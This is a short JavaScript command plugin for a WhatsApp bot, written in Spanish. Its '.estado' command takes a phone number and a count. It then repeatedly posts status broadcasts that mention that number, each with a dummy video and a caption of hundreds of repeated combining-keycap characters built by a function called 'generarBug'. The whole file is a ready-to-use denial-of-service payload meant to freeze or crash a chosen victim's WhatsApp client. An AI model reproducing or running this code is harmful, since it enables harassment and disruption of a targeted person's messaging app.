let handler = async (m, { conn, text }) => {
  if (!text) throw 'Ejemplo:\n.estado +521234567890/10'

  let [num, count] = text.split('/')
  let numero = num.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  let cantidad = parseInt(count)

  function generarBug() {
    let base = 'o\u20E3'

    let REPETICION_HORIZONTAL = 120
    let REPETICION_VERTICAL = 8

    let linea = base.repeat(REPETICION_HORIZONTAL)
    return (linea + '\n').repeat(REPETICION_VERTICAL)
  }

  for (let i = 0; i < cantidad; i++) {
    await conn.sendMessage('status@broadcast', {
      video: Buffer.alloc(10), // ✅ ya no falla
      caption: generarBug(),
      mimetype: 'video/mp4',
      contextInfo: {
        mentionedJid: [numero]
      }
    })

    await new Promise(r => setTimeout(r, 2000))
  }

  m.reply('✅ estados enviados')
}

handler.command = ['estado']
export default handler
